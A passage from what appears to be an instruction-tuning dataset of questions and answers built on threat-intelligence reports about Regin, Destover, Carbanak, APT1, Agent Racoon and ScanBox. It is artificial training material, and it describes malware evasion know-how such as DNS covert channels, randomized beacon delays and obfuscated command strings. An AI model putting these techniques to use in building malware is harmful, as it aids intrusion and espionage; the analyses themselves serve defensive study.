operation of this threat would have required a significant investment of time and resources. Threats of this nature are rare and are only comparable to the Stuxnet/Duqu family of malware. The discovery of Regin serves to highlight how significant investments continue to be made into the development of tools for use in intelligence gathering. Many components of Regin have still gone undiscovered and additional functionality and versions may exist.\nSmall Headline: Data files\nRegin's data files are classified as Stage 5 components and are contained in an EVFS container.\nAs the data files are stored in a container, they do not have names. Just like Stage 5 modules, they are referenced by their filetag, which is the aggregation of the major and minor identifiers. The major identifier indicates which major routine group likely handles or creates the file.\nNot all data files have been recovered, so the information remains incomplete.\nData files associated with Stage 4 kernel modules have not been recovered\nTable 8 lists recovered data files used by Stage 5 modules.\nThe associated modules that supposedly manipulate those data files were not recovered.\nSmall Headline: About Symantec\nSymantec Corporation (NASDAQ: SYMC) is an information protection expert that helps people, businesses and governments seeking the freedom to unlock the opportunities technology brings -- anytime, anywhere. Founded in April 1982, Symantec, a Fortune 500 company, operating one of the largest global data-intelligence networks, has provided leading security, backup and availability solutions for where vital information is stored, accessed and shared. The company's more than 20,000 employees reside in more than 50 countries. Ninety-nine percent of Fortune 500 companies are Symantec customers. In fiscal 2014, it recorded revenues of $6.7 billion.\nTo learn more go to  or connect with\n/\nSymantec at: .\nBig Headline: For specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters 350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nwww.symantec.com\nCopyright \u00a9 2014 Symantec Corporation. All rights reserved. Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nRegin: Top-tier espionage tool enables stealthy surveillance\n\nWhat are the key characteristics of Regin's command-and-control (C&C) operations? How does Regin ensure secure communication, and what protocols are used for C&C?",
    "output": "Regin's C&C operations are extensive and bidirectional, allowing both the attackers and compromised computers to initiate communications. Compromised computers can also serve as proxies for other infections, and command and control can occur in a peer-to-peer fashion. All communications are strongly encrypted and can happen in a two-stage fashion. Regin supports four transport protocols for C&C: ICMP, UDP, TCP, and HTTP. Payload information can be encoded and embedded in ICMP/ping data with the string 'shit' for data validation and CRC checks using the seed '31337'. HTTP payloads can be encoded within cookie data under various names and combined with another cookie for validation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: References\n[1] https://www.hex-rays.com/products/ida/.\n[2] http://www.metasploit.com/.\n[3] http://www.ollydbg.de/.\n[4] AMIN, R. M. Detecting Targeted Malicious Emails Through Supervised Classification of Persistent Threat and Recipient Oriented Features. Doctor of philisophy, George Washington University, 2011.\n[5] AMIN, R. M., RYAN, J., H, J. C., AND VAN DORP, J. R. Detecting Targeted Malicious Email. IEEE Security & Privacy 10, 3 (2012), 64\u201371.\n[6] BLYTHE, M., PETRIE, H., AND CLARK, J. A. F for Fake: Four Studies on How We Fall for Phish. In Proceedings of the SIGCHI Conference on Human Factors in Computing Systems (New York, NY, USA, 2011), CHI '11, ACM, pp. 3469\u20133478.\n[7] CERT. Vulnerability Notes Database Field Descriptions, 2014.\n[8] CHIEN, E., AND O'GORMAN, G. The Nitro Attack: Stealing Secrets from the Chemical Industry. Tech. rep., Symantec, 2011.\n[9] CITIZEN LAB. Information Operations and Tibetan Rights in the Wake of Self-Immolations: Part I. Tech. rep., University of Toronto, 2012.\n[10] CITIZEN LAB. Recent Observations in Tibet-Related Information Operations: Advanced social engineering for the distribution of LURK malware. Tech. rep., University of Toronto, 2012.\n[11] CITIZEN LAB. Permission to Spy: An Analysis of Android Malware Targeting Tibetans. Tech. rep., University of Toronto, 2013.\n[12] COVA, M., KRUEGEL, C., AND VIGNA, G. There is no free phish: an analysis of free and live phishing kits. In Proceedings of the 2nd Conference on USENIX Workshop on Offensive Technologies (July 2008), USENIX Association, p. 4.\n[13] CROSS, J. S., AND MUNSON, M. A. Deep pdf parsing to extract features for detecting embedded malware. Tech. rep., Sandia National Laboratories, 2011.\n[14] DEEP END RESEARCH. Library of Malware Traffic Patterns, 2013.\n[15] FAGERLAND, S. The Many Faces of Gh0st Rat. Tech. rep., Norman, 2012.\n[16] FAGERLAND, S. PlugX used against Mongolian targets. Tech. rep., 2013.\n[17] FIRST. Common Vulnerability Scoring System (CVSS-SIG), 2007.\n[18] GALPERIN,EVA,MARQUIS-BOIRE,MORGAN,SCOTTRAILTON, J. Quantum of Surveillance: Familiar Actors and Possible False Flags in Syrian Malware Campaigns \u2014 Electronic Frontier Foundation. Tech. rep., Electronic Frontier Foundation and The Citizen Lab, University of Toronto.\n[19] GIURA, P., AND WANG, W. A Context-Based Detection Framework for Advanced Persistent Threats. International Conference on Cyber Security (CyberSecurity) 0 (2012), 69\u201374.\n[20] GOOGLE. A new approach to China, 2012.\n[21] GRAGIDO, W. Lions at the Watering Hole: The VOHO Affair. Tech. rep., RSA, 2012.\n[22] HARDY, S. IEXPL0RE RAT. Tech. rep., Citizen Lab, University of Toronto, 2012.\n[23] HARDY,SETH KLEEMOLA, K. Surtr: Malware Family Targeting the Tibetan Community. Tech. rep., Citizen Lab, University of Toronto, 2013.\n[24] HUTCHINS, E. M., CLOPPERT, M. J., AND AMIN, R. M. Intelligence-driven computer network defense informed by analysis of adversary campaigns and intrusion kill chains. In 6th International Conference on Information Warfare and Security (2011).\n[25] INFORMATION WARFARE MONITOR. Tracking GhostNet: Investigating a Cyber Espionage Network. Tech. rep., University of Toronto, 2009.\n[26] INFORMATION WARFARE MONITOR. Shadows in the Cloud: Investigating Cyber Espionage 2.0. Tech. rep., University of Toronto, 2010.\n[27] JUNG, J., AND SIT, E. An Empirical Study of Spam Traffic and the Use of DNS Black Lists. In Proceedings of the 4th ACM SIGCOMM Conference on Internet Measurement (New York, NY, USA, 2004), IMC '04, ACM, pp. 370\u2013375.\n[28] KASPERSKY LAB. The NetTraveler Attacks. Tech. rep., Trend Micro, 2013.\n[29] KASPERSKY LAB. Unveiling \"Careto\" -The Masked APT. Tech. rep., 2014.\n[30] KIRLAPPOS, I., AND SASSE, M.-A. Security Education against Phishing: A Modest Proposal for a Major Rethink. Security Privacy, IEEE 10, 2 (Mar. 2012), 24\u201332.\n[31] KREBS, B. Espionage Hackers Target Watering Hole Sites, 2012.\n[32] LI, F., LAI, A., AND DDL, D. Evidence of Advanced Persistent Threat: A case study of malware for political espionage. In 2011 6th International Conference on Malicious and Unwanted Software (Oct. 2011), IEEE, pp. 102\u2013109.\n[33] LIN, E., GREENBERG, S., TROTTER, E., MA, D., AND AYCOCK, J. Does Domain Highlighting Help People Identify Phishing Sites? In Proceedings of the SIGCHI Conference on Human Factors in Computing Systems (New York, NY, USA, 2011), CHI '11, ACM, pp. 2075\u20132084.\n[34] MAIORCA, D., CORONA, I., AND GIACINTO, G. Looking at the Bag is Not Enough to Find the Bomb: An Evasion of Structural Methods for Malicious PDF Files Detection. In Proceedings of the 8th ACM SIGSAC Symposium on Information, Computer and Communications Security (New York, NY, USA, 2013), ASIA CCS '13, ACM, pp. 119\u2013130.\n[35] MARCZAK, B., GUARNIERI, C., MARQUIS-BOIRE, M., AND SCOTT-RAILTON, J. Hacking Team and the Targeting of Ethiopian Journalists. Tech. rep., Citizen Lab, University of Toronto, 2014.\n[36] MARQUIS-BOIRE, M. Backdoors are Forever: Hacking Team and the Targeting of Dissent. Tech. rep., Citizen Lab, University of Toronto, 2013.\n[37] MARQUIS-BOIRE, M. Iranian anti-censorship software 'Simurgh' circulated with malicious backdoor. Tech. rep., Citizen Lab, University of Toronto, 2013.\n[38] MARQUIS-BOIRE, M., MARCZAK, B., GUARNIERI, C., AND SCOTT-RAILTON, J. For Their Eyes Only: The Commercialization of Digital Spying. Tech. rep., Citizen Lab, University of Toronto, 2013.\n[39] MAURER, M.-E., AND HOFER\u00a8 , L. Sophisticated Phishers Make More Spelling Mistakes: Using URL Similarity against Phishing. In CSS (2012), pp. 414\u2013426.\n[40] MCAFEE. Enfal, 2008.\n[41] MICROSOFT CORPORATION. Security Bulletin Severity Rating System, 2012.\n[42] PANTEL, P., AND LIN, D. SpamCop: A Spam Classification & Organization Program. In Learning for Text Categorization: Papers from the 1998 Workshop (1998), pp. 95\u201398.\n[43] PAZ, R. D. PlugX: New Tool For a Not So New Campaign. Tech. rep., Trend Micro, 2012.\n[44] PERLROTH, N. Chinese Hackers Infiltrate New York Times Computers, Jan. 2013.\n[45] RAMACHANDRAN, A., FEAMSTER, N., AND VEMPALA, S. Filtering spam with behavioral blacklisting. In Proceedings of the 14th ACM conference on Computer and communications security -CCS '07 (New York, New York, USA, Oct. 2007), ACM Press, p. 342.\n[46] RILEY, M., AND LAWRENCE, D. Hackers Linked to Chinas Army Seen From EU to D.C., 2012.\n[47] ROGIN, J. NSA Chief: Cybercrime constitutes the greatest transfer of wealth in history. Foreign Policy (2012).\n[48] RSA. Anatomy of an Attack.\n[49] SANCHO,DAVID,VILLENEUVE, N. LURID: Attribution Isn't Easy. Tech. rep., Trend Micro.\n[50] SANS. @Risk: The Consensus Security Alert, 2014.\n[51] SMUTZ, C., AND STAVROU, A. Malicious PDF Detection Using Metadata and Structural Features. In Proceedings of the 28th Annual Computer Security Applications Conference (New York, NY, USA, 2012), ACSAC '12, ACM, pp. 239\u2013248.\n[52] TAYLOR, B. Sender Reputation in a Large Webmail Service. In Third Conference on Email and Anti-Spam (CEAS 2006) (2006).\n[53] TIBET ACTION INSTITUTE. https://tibetaction.net/detach-from-attachments/.\n[54] TREND MICRO. IXESHE: An APT campaign. Tech. rep., 2012.\n[55] TREND MICRO. Luckycat Redux: Inside an APT campaign with multiple targets in India and Japan. Tech. rep., 2012.\n[56] TREND MICRO. 2Q Report on Targeted Attack Campaigns. Tech. rep., 2013.\n[57] TZERMIAS, Z., SYKIOTAKIS, G., POLYCHRONAKIS, M., AND MARKATOS, E. P. Combining Static and Dynamic Analysis for the Detection of Malicious Documents. In Proceedings of the Fourth European Workshop on System Security (New York, NY, USA, 2011), EUROSEC '11, ACM, pp. 4:1\u2014-4:6.\n[58] UNITED NATIONS. International Covenant on Civil and Political Rights.\n[59] UNITED NATIONS. International Covenant on Economic, Social and Cultural Rights.\n[60] UNITED NATIONS. The Universal Declaration of Human Rights.\n[61] VAN HORENBEECK, M. Crouching PowerPoint, Hidden Trojan. In 24th Chaos Communications Congress (2007).\n[62] VAN HORENBEECK, M. Cyber attacks against Tibetan communities. Tech. rep., Sans Institute, 2008.\n[63] VAN HORENBEECK, M. Is Troy Burning? An overview of targeted trojan attacks. In SANSFire 2008 (2008).\n[64] VILLENEUVE, N. Human Rights and Malware Attacks. Tech. rep., Citizen Lab, University of Toronto, 2010.\n[65] VILLENEUVE, N. Nobel Peace Prize, Amnesty HK and Malware. Tech. rep., Citizen Lab, University of Toronto, 2010.\n[66] VILLENEUVE, N. Trends in targeted attacks. Tech. rep., Trend Micro, 2011.\n[67] VILLENEUVE, N., AND WALTON, G. Targeted Malware Attack on Foreign Correspondents based in China. Tech. rep., Information Warfare Monitor, University of Toronto, 2009.\n[68] VILLENEUVE, N., AND WALTON, G. 0day: Civil Society and Cyber Security. Tech. rep., Information Warfare Monitor, University of Toronto, 2009.\n[69] XIANG, G., HONG, J., ROSE, C. P., AND CRANOR, L. CANTINA+: A Feature-Rich Machine Learning Framework for Detecting Phishing Web Sites. ACM Trans. Inf. Syst. Secur. 14,2 (Sept. 2011), 21:1\u2014-21:28.\n[70] ZHANG, L., ZHU, J., AND YAO, T. An Evaluation of Statistical Spam Filtering Techniques. Transactions on Asian Language Information Processing 3, 4 (Dec. 2004), 243\u2013269.\n[71] ZHOU, Y., MULEKAR, M. S., AND NERELLAPALLI, P. Adaptive Spam Filtering Using Dynamic Feature Space. In Proceedings of the 17th IEEE International Conference on Tools with Artificial Intelligence (Nov. 2005), IEEE Computer Society, pp. 302\u2013309.\nFrom: world fdc <fdc2008paris@gmail.com>\nTo: [Tibet Group 1]\nSubject: Invitation\nPlease reply\n1 Attachment: invitation.doc\nFigure 6: Example of e-mail with Targeting Score 1\nFrom: ciran nima <nimaciran@gmail.com>\nTo: [Tibet Group 1]\nDate: 18 Aug 2011\nSubject: Truth of monk dies after setting himself on fire\nTruth of monk dies after setting himself on fire\n1 Attachment: Truth of monk dies after setting himself on fire.doc\nFigure 7: Example of e-mail with Targeting Score 2\nRead the text above and answer this question: How does the Targeted Threat Index (TTI) differ from other scoring systems used for characterizing the level of severity and danger of a technical vulnerability?",
    "output": "The Targeted Threat Index (TTI) is a unique metric developed to rank the sophistication of targeted email attacks, combining both the technical sophistication of the malware and the sophistication of the social engineering used to deliver it. Unlike other scoring systems that focus solely on the severity and danger of technical vulnerabilities, TTI provides insights into the relative sophistication of social engineering and malware leveraged against civil society organizations (CSOs).",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: NOV 2014: SONY ATTACK DESTOVER BACKDOOR SAMPLES ARE BASED ON KORDLLBOT\nThe Destover \"lightweight backdoor\" (sha256 4c2efe2f1253b94f16a1cab032f36c7883e4f6c8d9fc17d0ee553b5afb16330c) mentioned in official statements related to the Sony intrusion is a digitally signed file. There is also an almost identical unsigned file in existence with the sha256 eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55. This unsigned file is the original. It was established that the signed file was created as a \"joke\" by a researcher (4).\nWe were able to locate more malware samples similar to this backdoor. Many of these were created in a timeframe well before the Sony intrusion came to light. Some also match the import hash indicators mentioned in the US-CERT advisory, though import hashes are non-unique indicators and cannot always be relied upon.\nCloser investigation reveals that this Destover sample is indeed derived from the same source base as KorDllbot. This is based on the following indicators:\n\u2022 The Chopstring API string obfuscation\n\u2022 The CMXE command line construction\n\u2022 Same way of declaring API's\n\u2022 Similarities with later samples, such as:\no A printf \"MessageThread\" statement in the beginning of the command handling function (similar to Destover \"MessageThread\" samples)\no Use of the XOR-A7 encoding to decode strings (similar to Destover \"b076e058\" samples)\nThroughout 2014 and 2015 and still ongoing in 2016, Destover-related backdoors have continued to be used in various campaigns. They share many common traits, but there are also clear differences in functionality, hinting at a common source repository but where customization is added as needed. Some subfamilies have received their own variant names \u2013 i.e. Volgmer and Duuzer \u2013 while others have no separate moniker. See appendix for detailed descriptions of variants.\n\nHow does the analysis of the Destover 'lightweight backdoor' sample reveal its connection to KorDllbot, and what specific indicators support this conclusion?",
    "output": "A: The analysis of the Destover 'lightweight backdoor' sample reveals its connection to KorDllbot through several specific indicators. These indicators include the use of the Chopstring API string obfuscation technique, the CMXE command line construction, and the same method of declaring APIs. Additionally, there are similarities with later samples, such as a 'printf MessageThread' statement at the beginning of the command handling function, which is similar to Destover 'MessageThread' samples, and the use of the XOR-A7 encoding to decode strings, which is similar to Destover 'b076e058' samples. These shared traits suggest a common source base between the Destover sample and KorDllbot.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "New Carbanak / Anunak Attack Methodology\nPosted By Brian Hussey\nIn the last month Trustwave was engaged by two separate hospitality clients, and one restaurant chain for investigations by an unknown attacker or attackers. The modus operandi for all three investigations were very similar and appear to be a new Carbanak gang attack methodology, focused on the hospitality industry. Carbanak is a prolific crime group, well known for stealing over one billion dollars from banks in 2015 (*Kaspersky estimated loss) and more recently orchestrating an attack on the Oracle Micros POS support site that put over one million Point of Sale systems at risk. The current investigations are still underway but the known indicators of compromise in these new attacks will be presented below. At the time of investigation this malware was not correctly detected by any existing antivirus engines, and domains / IP's were not found in any commercial threat intelligence feeds.\nIt is also interesting to note that just during the time that it took to write this blog, Carbanak returned to their victims with significantly upgraded malware. This demonstrates the speed and versatility of this threat group. We have included analysis for two separate versions of AdobeUpdateManagementTool.vbs in this report. (The malware used following the initial infection) Version two arrived only two weeks after we began investigating this new campaign.\nQ: Why did the Carbanak/Anunak group target the hospitality industry in their new attack methodology, and how does this shift highlight the versatility and adaptability of this APT group?",
    "output": "The Carbanak/Anunak group targeted the hospitality industry in their new attack methodology as part of a strategic shift, demonstrating their versatility and adaptability. This group, known for stealing over one billion dollars from banks in 2015 and orchestrating an attack on the Oracle Micros POS support site, showcased their ability to quickly evolve their tactics. During the investigation, it was noted that the malware used in these attacks was not detected by any existing antivirus engines, and the associated domains/IPs were not found in any commercial threat intelligence feeds. Furthermore, within just two weeks of the start of the investigation, Carbanak returned with significantly upgraded malware, illustrating the speed and sophistication of their operations. This highlights the importance of continuous monitoring and adaptive defense strategies for cybersecurity experts dealing with such advanced persistent threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Synopsis of PLA Unit 61398\nThe evidence we have collected on PLA Unit 61398's mission and infrastructure reveals an organization that:\n\u00bb\u00bb Employs hundreds, perhaps thousands of personnel\n\u00bb\u00bb Requires personnel trained in computer security and computer network operations\n\u00bb\u00bb Requires personnel proficient in the English language\n\u00bb\u00bb Has large-scale infrastructure and facilities in the \"Pudong New Area\" of Shanghai\n\u00bb\u00bb Was the beneficiary of special fiber optic communication infrastructure provided by state-owned enterprise China Telecom in the name of national defense\nThe following sections of this report detail APT1's cyber espionage and data theft operations. The sheer scale and duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this campaign. We will demonstrate that the nature of APT1's targeted victims and the group's infrastructure and tactics align with the mission and infrastructure of PLA Unit 61398.\nOnce APT1 has compromised a network, they repeatedly monitor and steal proprietary data and communications from the victim for months or even years. For the organizations in (<>)Figure 10, we found that APT1 maintained access to the victim's network for an average of 356 days.27 The longest time period APT1 maintained access to a victim's network was at least 1,764 days, or four years and ten months. APT1 was not continuously active on a daily basis during this time period; however, in the vast majority of cases we observed, APT1 continued to commit data theft as long as they had access to the network.\nMedium Headline: APT1's Geographic & Industry Focus\nThe organizations targeted by APT1 primarily conduct their operations in English. However, we have also seen the group target a small number of non-English speaking victims. A full 87% of the APT1 victims we have observed are headquartered in countries where English is the native language (see (<>)Figure 11). This includes 115 victims located in the U.S. and seven in Canada and the United Kingdom. Of the remaining 19 victims, 17 use English as a primary language for operations. These include international cooperation and development agencies, foreign governments in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their business in English. Only two victims appear to operate using a language other than English. Given that English-language proficiency is required for many members of PLA Unit 61398, we believe that the two non-English speaking victims are anomalies representing instances in which APT1 performed tasks outside of their normal activities.\n27  This is based on 91 of the 141 victim organizations shown. In the remaining cases, APT1 activity is either ongoing or else we do not have visibility into the last known date of APT1 activity in the network.\nFIGure 11: Geographic location of aPt1's victims. In the case of victims with a multinational presence, the location shown reflects either the branch of the organization that aPt1 compromised (when known), or else is the location of the organization's headquarters.\nAPT1 has demonstrated the capability and intent to steal from dozens of organizations across a wide range of industries virtually simultaneously. (<>)Figure 12 provides a view of the earliest known date of APT1 activity against all of the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that APT1's mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction of APT1 victims that we confirmed directly, the range of industries that APT1 targets may be even broader than our findings suggest.\nFurther, the scope of APT1's parallel activities implies that the group has significant personnel and technical resources at its disposal. In the first month of 2011, for example, (<>)Figure 12 shows that APT1 successfully compromised 17 new victims operating in 10 different industries. Since we have seen that the group remains active in each victim's network for an average of nearly a year after the initial date of compromise, we infer that APT1 committed these 17 new breaches while simultaneously maintaining access to and continuing to steal data from a number of previously compromised victims.\nTIMELINE OF APT1 COMPROMISES BY INDUSTRY SECTOR\nFIGure 12: timeframe of aPt1's cyber espionage operations against organizations by industry. the dots within each bar represent the earliest known date on which aPt1 compromised a new organization within the industry.\nWe believe that organizations in all industries related to China's strategic priorities are potential targets of APT1's comprehensive cyber espionage campaign. While we have certainly seen the group target some industries more  heavily than others (see (<>)Figure 13), our observations confirm that APT1 has targeted at least four of the seven  strategic emerging industries that China identified in its 12th Five Year Plan.28\nIndustries Compromised by APT1\nFIGure 13: number of aPt1 victims by industry. we determined each organization's industry based on reviewing its industry classification in the hoover's29 system. we also considered the content of the data that aPt1 stole in each case, to the extent that this information was available.\n28  Joseph Casey and Katherine Koleski, Backgrounder: China's 12th Five-Year Plan, U.S.-China Economic & Security Review Commission (2011), 19, (<http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf>)http://www.uscc.gov/researchpapers/2011/12th-FiveYearPlan_062811.pdf, accessed February 3, 2013.\n29  http://www.hoovers.com/\nMedium Headline: APT1 Data Theft\nAPT1 steals a broad range of information from its victims. The types of information the group has stolen relate to:\n\u00bb\u00bb product development and use, including information on test results, system designs, product manuals, parts lists, and simulation technologies;\n\u00bb\u00bb manufacturing procedures, such as descriptions of proprietary processes, standards, and waste management processes;\n\u00bb\u00bb business plans, such as information on contract negotiation positions and product pricing, legal events, mergers, joint ventures, and acquisitions;\n\u00bb\u00bb policy positions and analysis, such as white papers, and agendas and minutes from meetings involving high-ranking personnel;\n\u00bb\u00bb emails of high-ranking employees; and\n\u00bb\u00bb user credentials and network architecture information.\nIt is often difficult for us to estimate how much data APT1 has stolen during their intrusions for several reasons:\n\u00bb\u00bb APT1 deletes the compressed archives after they pilfer them, leaving solely trace evidence that is usually overwritten during normal business activities.\n\u00bb\u00bb Pre-existing network security monitoring rarely records or identifies the data theft.\n\u00bb\u00bb The duration of time between the data theft and Mandiant's investigation is often too great, and the trace evidence of data theft is overwritten during the normal course of business.\n\u00bb\u00bb Some victims are more intent on assigning resources to restore the security of their network in lieu of investigating and understanding the impact of the security breach.\nEven with these challenges, we have observed APT1 steal as much as 6.5 terabytes of compressed data from a single organization over a ten-month time period. Given the scope of APT1's operations, including the number of organizations and industries we have seen them target, along with the volume of data they are clearly capable of stealing from any single organization, APT1 has likely stolen hundreds of terabytes from its victims.\nAlthough we do not have direct evidence indicating who receives the information that APT1 steals or how the recipient processes such a vast volume of data, we do believe that this stolen information can be used to obvious advantage by the PRC and Chinese state-owned enterprises. As an example, in 2008, APT1 compromised the network of a company involved in a wholesale industry. APT1 installed tools to create compressed file archives and to extract emails and attachments. Over the following 2.5 years, APT1 stole an unknown number of files from the victim and repeatedly accessed the email accounts of several executives, including the CEO and General Counsel. During this same time period, major news organizations reported that China had successfully negotiated a double-digit decrease in price per unit with the victim organization for one of its major commodities. This may be coincidental; however, it would be surprising if APT1 could continue perpetrating such a broad mandate of cyber espionage and data theft if the results of the group's efforts were not finding their way into the hands of entities able to capitalize on them.\nAnswer this question: Why is it challenging to estimate the amount of data stolen by APT1 during their intrusions?",
    "output": "Estimating the amount of data stolen by APT1 is challenging due to several factors. Firstly, APT1 deletes the compressed archives after stealing them, leaving only trace evidence that is often overwritten during normal business activities. Secondly, pre-existing network security monitoring rarely records or identifies the data theft. Thirdly, the duration of time between the data theft and Mandiant's investigation is often too great, leading to the trace evidence being overwritten. Lastly, some victims prioritize restoring network security over investigating the impact of the security breach, making it difficult to assess the full extent of the data theft.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Agent Racoon Backdoor\nThe Agent Racoon malware family is built to provide backdoor capabilities. It is written using the .NET framework, and leverages DNS to establish a covert channel with the C2 server. Unit 42 researchers named the malware family Agent Racoon due to some references found within the code of the identified samples, as shown in Figure 7.\nWhen executed, the threat has some predefined settings such as:\nThe base domain used to create the DNS covert channel\nA unique key per sample, used as a seed to generate an encryption password to encrypt the DNS communication\nA fallback DNS server if no DNS server can be read from the compromised system\nAll the C2 domains identified fulfill the same base pattern, with unique values for the four character identifier across different samples:\n[4 characters].telemetry.[domain].com\nThe value of Program.dns_ip is different for each sample found, which could indicate that the threat actor is building the binary with specific settings gathered from the targeted environment.\nWith that pattern, the threat communicates with the C2 server by adding additional subdomains to build the DNS query. It uses Internationalizing Domain Names for Applications' (IDNA) domain names with Punycode encoding. This encoding type is a representation of Unicode values over the ASCII encoding for internet hostnames.\nThe domain names follow the pattern below:\n[random_val].a.[4 characters].telemetry.[domain].com\nThe screenshot from Wireshark in Figure 9 illustrates a complete DNS query:\nTo manage the communication with the C2 server, the malware uses a communication loop shown in Figure 10.\nThe following are some main features of the communication loop above:\nThe communication loop finishes when the answer xn--cc is received from the C2 server, or a communication error occurs.\nThe randomized delay between messages can have multiple reasons:\nTo avoid network spikes.\nTo avoid potential network congestion.\nTo provide randomness as an attempt to avoid network beaconing detection.\nThe encryption of all the communication messages through Program.Util.RC.\nThe encryption routine implements a stream cipher that takes the initial unique key per sample Program.key (this.defaultkey), as shown in Figure 11. It then creates a 1-byte encryption key to later encrypt the message with an XOR.\nDepending on the length of the message sent to the C2 server, different subdomains are added to the query, as shown in the code snippet in Figure 12.\nThe this.Rand() component of the fully qualified domain name (FQDN) build is intended to avoid caching and ensure the request reaches out to the C2 server.\nAgent Racoon provides the following backdoor functionality:\nCommand execution\nFile uploading\nFile downloading\nAlthough Agent Racoon does not provide any sort of persistence mechanism by itself, during the activity we observed, the threat was executed by using scheduled tasks.\nUnit 42 researchers discovered the following samples using different subdomains of telemetry.geoinfocdn[.]com, as shown in Figure 13. The domain geoinfocdn[.]com was registered on 2022/08/19 UTC for one year.\nUnit 42 researchers were able to track the Agent Racoon malware family back to July 2022. Two samples of the malware family were uploaded to VirusTotal from Egypt and Thailand in September 2022 and July 2022 with the following SHA256 hashes:\n3a2d0e5e4bfd6db9c45f094a638d1f1b9d07110b9f6eb8874b75d968401ad69c\ndee7321085737da53646b1f2d58838ece97c81e3f2319a29f7629d62395dbfd1\nThese two samples used the same subdomain patterns, but this time the domain used for C2 was telemetry.geostatcdn[.]com. Threat actors performed the following activities regarding this domain on the dates shown:\nRegistered: 2020/08/27 UTC\nFirst seen in the wild: 2021/06/17 23:10:58 UTC\nRenewed: 2021/08/18 UTC\nExpired: 2022/08/27 UTC\nFigure 14 shows that with this information, two groups of malware samples can be identified using different C2 domain names and file paths since 2020.\nThe threat actor tried to disguise the Agent Racoon binary as Google Update and MS OneDrive Updater binaries.\nThe malware developers made small modifications to the source code in an attempt to evade detection. Some samples used a domain hard-coded in plain text to establish the DNS covert channel (as shown in Figure 15), whereas other samples used a Base64 encoded string.\nAside from the Base64 feature, the differences are in the settings and not in the actual source code, except for the sample with SHA256 hash 354048e6006ec9625e3e5e3056790afe018e70da916c2c1a9cb4499f83888a47.\nThis sample has a compilation timestamp that was modified and is outside the time frame of activity: 2075/02/23 08:12:59 UTC.\nAs shown in Figure 16, the threat actor also tried to obfuscate the constant cmd.exe to avoid signature-based detections. They did so by using the equivalent Base64 encoded value with the added constant 399 so the equivalent Base64 encoded string can't be detected through signatures.\n\nQuestion: Why does the Agent Racoon malware use a randomized delay between messages in its communication loop? Explain the potential benefits of this approach.\n\nAnswer:",
    "output": "The Agent Racoon malware uses a randomized delay between messages in its communication loop for several reasons. First, it helps to avoid network spikes, which can draw attention to the malicious activity. Second, it prevents potential network congestion, ensuring smoother communication. Lastly, it introduces randomness to avoid network beaconing detection, making it harder for security systems to identify the malicious traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Framework\nWhilst all four implementations share the same codebase, there are some minor differences in their implementations. These differences may show that different attackers are using the ScanBox framework.\nWe've outlined a few key differences we identified below:\nMalicious code was delivered in a single block of JavaScript on both webmailgoogle[.]com and foundationssl[.]com. The domains qoog1e[.]com and googlecaches[.]com selectively loaded extra plugins from separate files:\nWe can see how these differ by comparing two exploit kits side by side:\nA motivation for selectively loading plugins is likely to be to prevent crashes or any errors appearing (which may alert the compromised site's owner) when the page is loaded \u2013 as some of the plugins are only compatible with specific browsers. Selectively loading plugins has the added bonus of slightly reducing access to the attacker's code to researchers. Browsers the attackers are not interested in will be served the following placeholder instead of the malicious function:\nThe following ScanBox plugins are deployed on code.googlecaches[.]com, dependent upon the users browser:\nThere are further code differences too. Take for example the different implementations of software enumeration, by identifying whether certain files exist:\nFrom a developer's perspective, I know it's always a good idea to check the details of any exceptions that occur when writing code in order to create more stable applications. It's pleasing to see the ScanBox developers using good coding practices, though only if they're in the office!\nWhen identifying the security software, only the implementation found on foundationssl[.]com employs the full version of some publicly available code[5] (the section of code with informational messages such as \"\"Folder was found!\"\"). In all other versions only a subsection of the same code is used.\nAt this point we've established that there are subtle variations between the ScanBox code deployed on different websites, however this could be due to differences in the expected environment of the targets the attackers wish to infect in each case, or upgrades to the framework.\nBig Headline: Analysis of associated attacker infrastructure\nIn order to potentially group the activity observed together, we analysed network infrastructure associated with the domains used by the attacker(s) deploying the ScanBox framework. Our analysis showed that there was little overlap both in terms of associated infrastructure and in terms of the malware families associated with that infrastructure.\nSummaries of each cluster are given below, whilst full details of the components which made up each are available in the Appendix.\nWe have been unable to identify any direct overlaps between the clusters, i.e. shared domains or IP addresses, neither have we been able to determine any softer linkages beyond the reuse of the GoDaddy registrar.\nOf course this could be due to lack of data points available to us \u2013 we welcome any additional data points the community are available to provide which show linkages between the clusters shown below.\nVisualisations of each cluster can be seen in the Maltego graphs below:\nBig Headline: Conclusions\nIn this post we've identified four affected websites, each of which would draw distinct audiences who would be valuable to different actors. We've also taken a look at the variations in how the framework was implemented, and found a few subtle differences in the implementations. Finally, we analysed the associated infrastructure with the attacker domains used in each case, and found no overlap between the clusters of activity.\nIn a similar fashion to our previous blog entry on potential overlap between APT1 and Putter Panda[6] , we can attempt to explain these differences with several hypotheses:\n1. The framework is used by a single group that target widely and upgrade or adapt their code for different targets, and are careful to avoid any overlap in infrastructure or in services used.\n2. Selections of actors share some resources, as per previous observations with similar kits by some security vendors[7].\n3. The exploit kits have been 